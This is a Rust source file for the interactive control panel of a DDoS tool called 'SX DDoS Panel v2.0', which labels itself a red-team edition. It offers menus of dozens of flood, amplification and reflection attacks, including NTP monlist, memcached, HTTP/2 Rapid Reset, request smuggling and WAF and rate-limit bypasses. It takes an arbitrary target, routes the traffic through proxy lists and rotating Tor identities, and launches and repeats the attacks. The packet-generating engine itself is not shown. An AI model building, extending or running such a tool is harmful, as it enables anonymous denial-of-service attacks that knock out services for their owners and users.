use colored::*;
use std::io::{self, Write, BufRead};
use crate::config::{AttackConfig, ProxyType, ProxyStrategy};
use crate::attack::AttackEngine;
use crate::logger;

const BANNER: &str = r#"
 ███████╗██╗  ██╗    ██████╗ ██████╗  ██████╗ ███████╗    ██████╗  █████╗ ███╗   ██╗███████╗██╗
 ██╔════╝╚██╗██╔╝    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ██╔══██╗██╔══██╗████╗  ██║██╔════╝██║
 ███████╗ ╚███╔╝     ██║  ██║██║  ██║██║   ██║███████╗    ██████╔╝███████║██╔██╗ ██║█████╗  ██║
 ╚════██║ ██╔██╗     ██║  ██║██║  ██║██║   ██║╚════██║    ██╔═══╝ ██╔══██║██║╚██╗██║██╔══╝  ██║
 ███████║██╔╝ ██╗    ██████╔╝██████╔╝╚██████╔╝███████║    ██║     ██║  ██║██║ ╚████║███████╗███████╗
 ╚══════╝╚═╝  ╚═╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝
"#;

pub struct Panel { last_config: Option<AttackConfig> }

impl Panel {
    pub fn new() -> Self { Self { last_config: None } }

    pub async fn run(&mut self) {
        self.clear(); self.banner();
        loop {
            let proto = self.select_protocol();
            if proto == "exit" { self.goodbye(); break; }
            let methods = self.select_methods(&proto);
            if methods.is_empty() { continue; }
            let config = self.build_config(&proto, methods);
            self.last_config = Some(config.clone());
            self.print_summary(&config);
            AttackEngine::new(config).launch().await;
            loop {
                if self.ask_repeat() {
                    if let Some(cfg) = &self.last_config {
                        AttackEngine::new(cfg.clone()).launch().await;
                    }
                } else {
                    self.clear(); self.banner(); break;
                }
            }
        }
    }

    fn clear(&self) { print!("\x1B[2J\x1B[1;1H"); io::stdout().flush().ok(); }
    fn goodbye(&self) { println!("\n  {}\n", "[ SX Panel — Session Terminated ]".bright_red().bold()); }
    fn sep(&self) { println!("{}", "─".repeat(96).bright_black()); }
    fn hdr(&self, t: &str) {
        println!(); println!("  {}", format!("◈  {}", t).bright_cyan().bold()); self.sep();
    }
    fn banner(&self) {
        println!("{}", BANNER.bright_red().bold());
        println!("  {}   {}   {}",
            "[ SX DDoS Panel v2.0 ]".bright_yellow().bold(),
            "[ RED TEAM EDITION ]".bright_red(),
            "[ AUTHORIZED USE ONLY ]".bright_black());
        println!("{}", "━".repeat(96).bright_black());
        println!();
    }
    fn prompt(&self, label: &str) -> String {
        print!("  {}  {} ", "›".bright_yellow().bold(), label.white());
        io::stdout().flush().ok();
        let mut s = String::new();
        io::stdin().lock().read_line(&mut s).ok();
        s.trim().to_string()
    }
    fn row(n: &str, name: &str, desc: &str) {
        println!("  {}  {:<22}  {}",
            format!("[{:>3}]", n).bright_yellow(),
            name.bright_white().bold(),
            desc.bright_black());
    }

    fn select_protocol(&self) -> String {
        self.hdr("SELECT PROTOCOL");
        let list = vec![
            ("1","TCP","Layer 4 — full TCP flag/state bypass suite"),
            ("2","UDP","Layer 4 — stateless & amplification arsenal"),
            ("3","HTTP","Layer 7 — application flood + WAF/CDN bypass"),
            ("4","ICMP","Layer 3 — echo/smurf/fraggle/PoD"),
            ("5","ICMPv6","Layer 3 — IPv6 control plane"),
            ("6","DNS","Layer 7 — query/amplification/NXDOMAIN"),
            ("7","NTP","Layer 4 — reflection/monlist"),
            ("8","GRE","Layer 3 — tunnel flood"),
            ("9","SSDP","Layer 7 — UPnP reflection"),
            ("10","SNMP","Layer 7 — MIB walk reflection"),
            ("11","LDAP","Layer 7 — LDAP/CLDAP reflection"),
            ("12","SIP","Layer 7 — VoIP flood"),
            ("13","RTP","Layer 4 — media flood"),
            ("14","QUIC","Layer 4 — QUIC flood"),
            ("15","DHCP","Layer 2 — pool starvation"),
            ("16","IP","Layer 3 — frag/land/teardrop"),
            ("17","ARP","Layer 2 — flood/poison"),
            ("18","AMP","Amplification — COAP/TFTP/WSD/Steam/etc"),
            ("0","EXIT","Terminate"),
        ];
        for (n,name,desc) in &list { Self::row(n,name,desc); }
        println!();
        match self.prompt("Protocol").as_str() {
            "1"=>"tcp","2"=>"udp","3"=>"http","4"=>"icmp","5"=>"icmpv6",
            "6"=>"dns","7"=>"ntp","8"=>"gre","9"=>"ssdp","10"=>"snmp",
            "11"=>"ldap","12"=>"sip","13"=>"rtp","14"=>"quic","15"=>"dhcp",
            "16"=>"ip","17"=>"arp","18"=>"amp","0"=>"exit",
            _=>{ logger::log_warn("Invalid"); "tcp" }
        }.to_string()
    }

    fn methods_for(proto: &str) -> Vec<(&'static str, &'static str, &'static str)> {
        match proto {
            "tcp" => vec![
                ("1","syn","SYN Flood — half-open exhaustion"),
                ("2","ack","ACK Flood — bulk ACK storm"),
                ("3","rst","RST Flood — connection reset storm"),
                ("4","fin","FIN Flood — close storm"),
                ("5","syn_ack","SYN-ACK Flood"),
                ("6","push","PUSH Flood — data push storm"),
                ("7","null","NULL Flood — zero-flag packets"),
                ("8","xmas","Xmas Tree — all-flag combination"),
                ("9","connection","Connection Flood — socket exhaustion"),
                ("10","frag","Fragmentation — split stream DoS"),
                ("11","zero_window","Zero-Window — recv buffer 0 trick"),
                ("12","window_scale","Window Scale — WSopt manipulation"),
                ("13","ttl","TTL Variation — hop-limit evasion"),
                ("14","src_port","Source Port Rotation — rate-limit bypass"),
                ("15","half_open","Half-Open RST — RST at connect"),
                ("16","urgent","Urgent Pointer — URG flag storm"),
                ("17","mss","MSS Manipulation — min segment storm"),
                ("18","sockstress","Sockstress — resource hold"),
                ("19","persist","Persist Timer — 300s hold exploit"),
                ("20","mixed_flags","Mixed Flags — combined flag fuzzing"),
            ],
            "udp" => vec![
                ("1","udp","UDP Flood — 1472-byte burst"),
                ("2","udp_var","UDP Variable Size — mixed payload"),
                ("3","dns","DNS Query Flood"),
                ("4","dns_any","DNS ANY Flood — max amplification"),
                ("5","dns_amp","DNS EDNS0 Amplification"),
                ("6","dns_nxdomain","DNS NXDOMAIN — negative cache DoS"),
                ("7","ntp","NTP Monlist Amplification"),
                ("8","ssdp","SSDP UPnP Amplification"),
                ("9","cldap","CLDAP AD Amplification"),
                ("10","memcached","Memcached Amplification"),
                ("11","snmp","SNMP MIB Amplification"),
                ("12","chargen","Chargen Amplification"),
                ("13","voip","VoIP RTP Flood"),
                ("14","quic_amp","QUIC Initial Amplification"),
                ("15","coap","CoAP Amplification"),
                ("16","tftp","TFTP Amplification"),
                ("17","wsd","WS-Discovery Amplification"),
                ("18","plex","Plex Media Amplification"),
                ("19","steam","Steam/ARK Query Amplification"),
                ("20","openvpn","OpenVPN Amplification"),
                ("21","udp_spoof","Spoof-Source UDP Flood"),
            ],
            "http" => vec![
                ("1","get","GET Flood — bypass headers + cookies"),
                ("2","post","POST Flood — JSON body storm"),
                ("3","head","HEAD Flood"),
                ("4","put","PUT Flood — binary body"),
                ("5","delete","DELETE Flood — resource deletion"),
                ("6","options","OPTIONS CORS Flood"),
                ("7","patch","PATCH Flood — JSON Patch"),
                ("8","slowloris","Slowloris — 1000-conn hold"),
                ("9","slow_post","Slow POST — body drip"),
                ("10","slow_headers","Slow Headers — header drip"),
                ("11","h2reset","HTTP/2 Rapid Reset CVE-2023-44487"),
                ("12","h2flood","HTTP/2 Stream Flood"),
                ("13","cache","Cache Bypass — invalidation flood"),
                ("14","websocket","WebSocket Frame Flood"),
                ("15","chunked","Chunked Transfer WAF Bypass"),
                ("16","multipart","Multipart WAF Bypass"),
                ("17","smuggle_cl_te","Request Smuggling CL.TE"),
                ("18","smuggle_te_cl","Request Smuggling TE.CL"),
                ("19","xff","X-Forwarded-For Rate Limit Bypass"),
                ("20","bot","Bot UA Bypass — Googlebot/Bingbot"),
                ("21","tls_hello","TLS ClientHello Flood — JA3 spoof"),
                ("22","tls_session","TLS Session Resumption Flood"),
                ("23","graphql","GraphQL Introspection Flood"),
                ("24","api_key","API Key Rotation Bypass"),
                ("25","range","Range Header Bypass"),
                ("26","connect","CONNECT Tunnel Flood"),
                ("27","trace","TRACE Flood"),
            ],
            "icmp"=>vec![
                ("1","icmp","ICMP Echo Flood"),
                ("2","smurf","Smurf — broadcast amplification"),
                ("3","fraggle","Fraggle — UDP echo port 7"),
                ("4","pod","Ping of Death — 65500 byte ICMP"),
            ],
            "icmpv6"=>vec![
                ("1","icmpv6","ICMPv6 Raw Flood"),
                ("2","icmpv6_ns","Neighbor Solicitation — NDP DoS"),
                ("3","icmpv6_ra","Router Advertisement — defroute hijack"),
            ],
            "dns"=>vec![
                ("1","dns_query","DNS A Record Flood"),
                ("2","dns_any","DNS ANY Flood"),
                ("3","dns_amp","DNS EDNS0 Amplification"),
                ("4","dns_nxdomain","NXDOMAIN Cache DoS"),
                ("5","dns_txt","DNS TXT Flood"),
                ("6","dns_mx","DNS MX Flood"),
                ("7","dns_subdomain","Subdomain Flood"),
            ],
            "ntp"=>vec![
                ("1","ntp","NTP Monlist Amplification"),
                ("2","ntp_ref","NTP Reflection"),
                ("3","ntp_time","NTP Time Flood"),
            ],
            "gre"=>vec![
                ("1","gre","GRE Flood"),
                ("2","gre_keepalive","GRE Keepalive Flood"),
                ("3","gre_key","GRE Key Flood"),
            ],
            "ssdp"=>vec![
                ("1","ssdp","SSDP rootdevice"),
                ("2","ssdp_all","SSDP all devices"),
                ("3","ssdp_igd","SSDP IGD"),
            ],
            "snmp"=>vec![
                ("1","snmp","SNMP GetBulk"),
                ("2","snmp_v3","SNMPv3 Flood"),
                ("3","snmp_bulk","SNMP BulkWalk"),
            ],
            "ldap"=>vec![
                ("1","ldap","LDAP Reflection"),
                ("2","cldap_ref","CLDAP Reflection"),
                ("3","cldap_netlogon","CLDAP Netlogon Amplification"),
            ],
            "sip"=>vec![
                ("1","sip","SIP INVITE Flood"),
                ("2","sip_register","SIP REGISTER Flood"),
                ("3","sip_options","SIP OPTIONS Flood"),
                ("4","sip_cancel","SIP CANCEL Storm"),
            ],
            "rtp"=>vec![
                ("1","rtp","RTP Media Flood"),
                ("2","rtp_dtmf","RTP DTMF Flood"),
                ("3","rtcp","RTCP Control Flood"),
                ("4","rtp_jitter","RTP Jitter Flood"),
            ],
            "quic"=>vec![
                ("1","quic","QUIC Initial Flood"),
                ("2","quic_vneg","QUIC Version Negotiation"),
                ("3","quic_path","QUIC Path Challenge"),
                ("4","quic_stream","QUIC Stream Flood"),
            ],
            "dhcp"=>vec![
                ("1","dhcp","DHCP Discover Starvation"),
                ("2","dhcp_release","DHCP Release Flood"),
                ("3","dhcp_decline","DHCP Decline Flood"),
            ],
            "ip"=>vec![
                ("1","ip_frag","IP Fragmentation DoS"),
                ("2","ip_land","LAND Attack"),
                ("3","ip_teardrop","Teardrop — overlapping fragments"),
                ("4","ip_spoof","IP Spoof Flood"),
            ],
            "arp"=>vec![
                ("1","arp","ARP Broadcast Storm"),
                ("2","arp_poison","ARP Cache Poison"),
                ("3","arp_gratuitous","Gratuitous ARP Flood"),
            ],
            "amp"=>vec![
                ("1","coap","CoAP Amplification"),
                ("2","tftp","TFTP Amplification"),
                ("3","wsd","WS-Discovery Amplification"),
                ("4","plex","Plex Media Amplification"),
                ("5","steam","Steam Query Amplification"),
                ("6","openvpn","OpenVPN Amplification"),
                ("7","rdp_amp","RDP Amplification"),
                ("8","memcached","Memcached Amplification"),
                ("9","chargen","Chargen Amplification"),
            ],
            _=>vec![("1","flood","default")],
        }
    }

    fn select_methods(&self, proto: &str) -> Vec<String> {
        self.hdr(&format!("{} — METHODS", proto.to_uppercase()));
        let methods = Self::methods_for(proto);
        for (n,name,desc) in &methods { Self::row(n,name,desc); }
        println!();
        println!("  {}", "Single: 1  |  Multi: 1,3,7  |  All: all  |  Range: 1-5".bright_black().italic());
        println!();
        let input = self.prompt("Method(s)");

        if input.to_lowercase() == "all" {
            return methods.iter().map(|(_,m,_)| m.to_string()).collect();
        }

        
        if input.contains('-') && !input.contains(',') {
            let parts: Vec<&str> = input.split('-').collect();
            if parts.len() == 2 {
                if let (Ok(a), Ok(b)) = (parts[0].trim().parse::<usize>(), parts[1].trim().parse::<usize>()) {
                    let mut sel = vec![];
                    for i in a..=b {
                        if i > 0 && i <= methods.len() {
                            sel.push(methods[i-1].1.to_string());
                        }
                    }
                    if !sel.is_empty() { return sel; }
                }
            }
        }

        let mut selected = vec![];
        for part in input.split(',') {
            let part = part.trim();
            if let Ok(n) = part.parse::<usize>() {
                if n > 0 && n <= methods.len() {
                    selected.push(methods[n-1].1.to_string());
                }
            }
        }
        if selected.is_empty() {
            logger::log_warn("No valid selection — using method 1");
            if !methods.is_empty() { selected.push(methods[0].1.to_string()); }
        }
        selected
    }

    fn build_config(&self, proto: &str, methods: Vec<String>) -> AttackConfig {
        self.hdr("ATTACK PARAMETERS");
        let target   = self.prompt("Target IP / URL                            ");
        let port_s   = self.prompt("Port                   [default: 80]       ");
        let port     = port_s.parse::<u16>().unwrap_or(80);
        let dur_s    = self.prompt("Duration (seconds)     [default: 60]       ");
        let duration = dur_s.parse::<u64>().unwrap_or(60);
        let work_s   = self.prompt("Workers                [default: 100]      ");
        let workers  = work_s.parse::<usize>().unwrap_or(100);

        self.hdr("PROXY CONFIGURATION");
        println!("  {}", "SOCKS5://user:pass@host:port  |  SOCKS4://host:port  |  HTTP://host:port".bright_black());
        println!();
        let proxy_file = self.prompt("Proxy list file        [blank = skip]      ");
        let proxy_list: Vec<String> = if !proxy_file.is_empty() {
            match std::fs::read_to_string(&proxy_file) {
                Ok(c) => c.lines().filter(|l| !l.is_empty() && !l.starts_with('#')).map(|l| l.to_string()).collect(),
                Err(e) => { logger::log_error(&format!("Cannot read proxy file: {}", e)); vec![] }
            }
        } else { vec![] };

        let proxy_type_val: ProxyType = if !proxy_list.is_empty() {
            logger::log_info(&format!("Loaded {} proxies", proxy_list.len()));
            println!();
            println!("  {}  SOCKS5    {}  SOCKS4    {}  HTTP",
                "[1]".bright_yellow(), "[2]".bright_yellow(), "[3]".bright_yellow());
            match self.prompt("Proxy type").as_str() {
                "2" => ProxyType::Socks4,
                "3" => ProxyType::Http,
                _   => ProxyType::Socks5,
            }
        } else { ProxyType::Socks5 };
        let proxy_type = proxy_type_val;

        self.hdr("TOR CONFIGURATION");
        println!("  {}", "Requires tor binary in PATH. Identity rotated automatically.".bright_black());
        println!();
        let use_tor  = self.prompt("Enable Tor?            [y/N]              ").to_lowercase().starts_with('y');
        let tor_port = if use_tor {
            self.prompt("Tor SOCKS5 port        [default: 9050]   ").parse::<u16>().unwrap_or(9050)
        } else { 9050 };

        println!();
        let use_ssl = self.prompt("Use SSL/TLS?           [y/N]              ").to_lowercase().starts_with('y');

        let mut cfg = AttackConfig::default();
        cfg.target        = target;
        cfg.port          = port;
        cfg.duration_secs = duration;
        cfg.workers       = workers;
        cfg.methods       = methods;
        cfg.protocol      = proto.to_string();
        cfg.use_ssl       = use_ssl;

        cfg.proxy.enabled    = !proxy_list.is_empty();
        cfg.proxy.proxies    = proxy_list;
        cfg.proxy.proxy_type = proxy_type;
        cfg.proxy.strategy   = crate::config::ProxyStrategy::Random;
        cfg.proxy.health_check = false;

        cfg.tor.enabled          = use_tor;
        cfg.tor.socks_port       = tor_port;
        cfg.tor.control_port     = tor_port + 1;
        cfg.tor.rotate_every_secs = 30;

        cfg
    }

    fn print_summary(&self, cfg: &AttackConfig) {
        println!(); self.sep();
        println!("  {}", "◈  ATTACK SUMMARY".bright_red().bold()); self.sep();
        let w = 12usize;
        println!("  {:<w$}  {}", "Target".bright_black(),   cfg.target.bright_white().bold());
        println!("  {:<w$}  {}", "Port".bright_black(),     cfg.port.to_string().bright_white());
        println!("  {:<w$}  {}", "Protocol".bright_black(), cfg.protocol.to_uppercase().bright_cyan().bold());
        println!("  {:<w$}  {}", "Methods".bright_black(),  cfg.methods.join("  +  ").bright_yellow().bold());
        println!("  {:<w$}  {}", "Duration".bright_black(), format!("{}s", cfg.duration_secs).bright_white());
        println!("  {:<w$}  {}", "Workers".bright_black(),  cfg.workers.to_string().bright_white());
        println!("  {:<w$}  {}", "Proxies".bright_black(),  cfg.proxy.proxies.len().to_string().bright_white());
        println!("  {:<w$}  {}", "Tor".bright_black(),
            if cfg.tor.enabled { "ENABLED".bright_green().bold() } else { "DISABLED".bright_black() });
        println!("  {:<w$}  {}", "SSL/TLS".bright_black(),
            if cfg.use_ssl { "ENABLED".bright_green() } else { "DISABLED".bright_black() });
        self.sep(); println!();
        let c = self.prompt("Launch attack?         [Y/n]              ");
        if c.to_lowercase() == "n" { logger::log_warn("Attack aborted"); }
        println!();
    }

    fn ask_repeat(&self) -> bool {
        println!(); self.sep();
        println!("  {}", "◈  ATTACK COMPLETE".bright_green().bold()); self.sep();
        println!();
        println!("  {} Repeat against the same target with the same config?",
            "?".bright_yellow().bold());
        println!();
        println!("  {}  Repeat     {}  Main Menu",
            "[Y]".bright_green().bold(), "[N]".bright_red().bold());
        println!();
        self.prompt("Choice").to_lowercase().starts_with('y')
    }
}
